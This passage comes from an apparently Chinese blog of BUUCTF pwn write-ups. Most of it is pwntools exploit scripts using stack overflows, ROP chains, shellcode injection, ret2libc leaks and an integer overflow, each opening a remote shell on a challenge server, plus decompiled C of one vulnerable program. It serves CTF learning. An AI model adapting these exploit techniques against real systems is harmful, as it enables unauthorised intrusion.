修改内存的长度</span><br><span class="line">    prot 内存的权限 <span class="comment">//r+w+x=7</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;i386&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(b&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25074</span>)</span><br><span class="line">elf = ELF(<span class="string">b&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">bss_addr = <span class="number">0x080EC000</span></span><br><span class="line">read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop3_ret = <span class="number">0x080509a5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#esp到ebp的距离最好从gdb中调试得来，也可从ida的stack页面得到，不过要注意观察栈里是否多了或少了某些东西</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(mprotect_addr) + p32(pop3_ret) + p32(bss_addr) + p32(<span class="number">0x100</span>) + p32(<span class="number">7</span>)</span><br><span class="line">payload += p32(read_addr) + p32(pop3_ret) + p32(<span class="number">0</span>) + p32(bss_addr)+p32(<span class="number">0x100</span>) + p32(bss_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(b&#x27;./bjdctf_2020_babystack&#x27;)</span></span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27366</span>)</span><br><span class="line">elf = ELF(<span class="string">b&#x27;./bjdctf_2020_babystack&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x4006E6</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;[+]Please input the length of your name:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;[+]What\&#x27;s u name?&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(system_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h1><p>本题同ciscn_2019_c_1</p><h1 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h1><p>同get_started_3dsctf_2016</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;i386&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(b&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28153</span>)</span><br><span class="line"><span class="comment">#elf = ELF(b&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">b&#x27;./not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">bss_addr = <span class="number">0x080EB000</span></span><br><span class="line">read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop3_ret = <span class="number">0x0809e3e5</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2d</span> + p32(mprotect_addr) + p32(pop3_ret) + p32(bss_addr) + p32(<span class="number">0x100</span>) + p32(<span class="number">7</span>)</span><br><span class="line">payload += p32(read_addr) + p32(pop3_ret) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">0x100</span>) + p32(bss_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h1><p>远程打通了，但我没找到flag……</p><p><img src="/2021/10/28/buuctf-pwn-1/7.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(b&#x27;./HarekazeCTF2019babyrop&#x27;)</span></span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26513</span>)</span><br><span class="line">elf = ELF(<span class="string">b&#x27;./HarekazeCTF2019babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = <span class="built_in">next</span>(elf.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">pop_ret_addr = <span class="number">0x0000000000400683</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;system_addr: &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">print(<span class="string">&quot;bin_sh_addr &quot;</span> + <span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(pop_ret_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(b&#x27;./jarvisoj_level2_x64&#x27;)</span></span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29806</span>)</span><br><span class="line">elf = ELF(<span class="string">b&#x27;./jarvisoj_level2_x64&#x27;</span>)</span><br><span class="line">system_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = <span class="built_in">next</span>(elf.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">pop_rdi = <span class="number">0x00000000004006b3</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(b&#x27;./ciscn_2019_n_5&#x27;)</span></span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29222</span>)</span><br><span class="line">elf = ELF(<span class="string">b&#x27;./ciscn_2019_n_5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;tell me your name&#x27;</span>)</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;What do you want to say to me?&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(<span class="number">0x0000000000601080</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a>others_shellcode</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc node4.buuoj.cn 29860                    </span><br></pre></td></tr></table></figure><p>做了一个execve调用，直接nc连。</p><h1 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h1><p>查看保护措施</p><p><img src="/2021/10/28/buuctf-pwn-1/8.png"></p><h2 id="main-1"><a href="#main-1" class="headerlink" title="main"></a>main</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+0h] [ebp-100h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> src[<span class="number">4</span>]; <span class="comment">// [esp+4h] [ebp-FCh] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">124</span>]; <span class="comment">// [esp+8h] [ebp-F8h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">4</span>]; <span class="comment">// [esp+84h] [ebp-7Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v8[<span class="number">96</span>]; <span class="comment">// [esp+88h] [ebp-78h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> *v9; <span class="comment">// [esp+F4h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v9 = &amp;argc;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  *s1 = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="keyword">sizeof</span>(v8));</span><br><span class="line">  *src = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="keyword">sizeof</span>(v6));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to use LFS.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input admin password:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%100s&quot;</span>, s1);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;administrator&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Password Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your operation:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Add a log.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Display all logs.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Print all logs.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0.Exit\n:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">switch</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      AddLog(src);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      Display(src);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      Print();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      GetFlag(src);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_804892B();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AddLog"><a href="#AddLog" class="headerlink" title="AddLog"></a>AddLog</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">AddLog</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input new log info:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __isoc99_scanf(<span class="string">&quot;%128s&quot;</span>, a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="GetFlag"><a href="#GetFlag" class="headerlink" title="GetFlag"></a>GetFlag</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">GetFlag</span><span class="params">(<span class="keyword">char</span> *src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">60</span>]; <span class="comment">// [esp+4h] [ebp-44h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *dest = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;The flag is your log:%s\n&quot;</span>, dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过在AddLog里对src的写入影响dest，从而造成栈溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;i386&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(b&#x27;./ciscn_2019_ne_5&#x27;)</span></span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28370</span>)</span><br><span class="line">elf = ELF(<span class="string">b&#x27;./ciscn_2019_ne_5&#x27;</span>)</span><br><span class="line">system_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh_addr = <span class="built_in">next</span>(elf.search(<span class="string">b&#x27;sh\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#system_addr = 0x80484d0</span></span><br><span class="line"><span class="comment">#sh_addr = 0x80482ea</span></span><br><span class="line">print(<span class="string">&quot;system_addr: &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">print(<span class="string">&quot;sh_addr: &quot;</span> + <span class="built_in">hex</span>(sh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x48</span> + <span class="number">4</span>) + p32(system_addr) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(sh_addr)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please input admin password:&#x27;</span>, <span class="string">b&#x27;administrator&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;0.Exit\n:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;info:&#x27;</span>, payload)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;0.Exit\n:&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="2018-rop"><a href="#2018-rop" class="headerlink" title="2018_rop"></a>2018_rop</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(os=&quot;linux&quot;,arch=&quot;i386&quot;,log_level=&quot;debug&quot;)</span></span><br><span class="line"><span class="comment">#io = process(b&#x27;./2018_rop&#x27;)</span></span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29688</span>)</span><br><span class="line">elf = ELF(<span class="string">b&#x27;./2018_rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">0</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">#print(&quot;222&quot;)</span></span><br><span class="line">write_addr = u32(io.recv())</span><br><span class="line">print(<span class="string">&quot;write_addr: &quot;</span> + <span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libcbase = write_addr - <span class="number">0xe56f0</span></span><br><span class="line">str_bin_sh = <span class="number">0x17b8cf</span> + libcbase</span><br><span class="line">system = <span class="number">0x3cd10</span> + libcbase</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(system) + p32(main_addr) + p32(str_bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(os=&quot;linux&quot;,arch=&quot;i386&quot;,log_level=&quot;debug&quot;)</span></span><br><span class="line"><span class="comment">#io = process(b&#x27;./bjdctf_2020_babyrop&#x27;)</span></span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28834</span>)</span><br><span class="line">elf = ELF(<span class="string">b&#x27;./bjdctf_2020_babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400733</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Pull up your sword and tell me u story!\n&#x27;</span>)</span><br><span class="line"><span class="comment">#print(io.recv())</span></span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">print(<span class="string">&quot;puts_addr: &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libcbase = puts_addr - <span class="number">0x6f690</span></span><br><span class="line">str_bin_sh = <span class="number">0x18cd57</span> + libcbase</span><br><span class="line">system_addr = <span class="number">0x45390</span> + libcbase</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(pop_rdi) + p64(str_bin_sh) + p64(system_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h1><p>整数溢出，这题把读取的有符号数当作无符号数使用，随便输一个负数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> io:</span><br><span class="line">    io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27271</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./bjdctf_2020_babystack2&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./bjdctf_2020_babystack2&#x27;</span>)</span><br><span class="line">backdoor_addr = elf.symbols[<span class="string">&#x27;backdoor&#x27;</span>]</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;[+]Please input the length of your name:\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;-1000000&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(backdoor_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h1><p>第一道堆体，看了好多wp还用了2天才出来，还是太菜了<br><a href="https://blog.csdn.net/carol2358/article/details/105946384">方法1</a><br><a href="https://bbs.pediy.com/thread-223461.htm#msg_header_h1_3">方法2</a><br><a href="https://www.bilibili.com/video/BV1x64y1r728">bilibili视频讲解</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 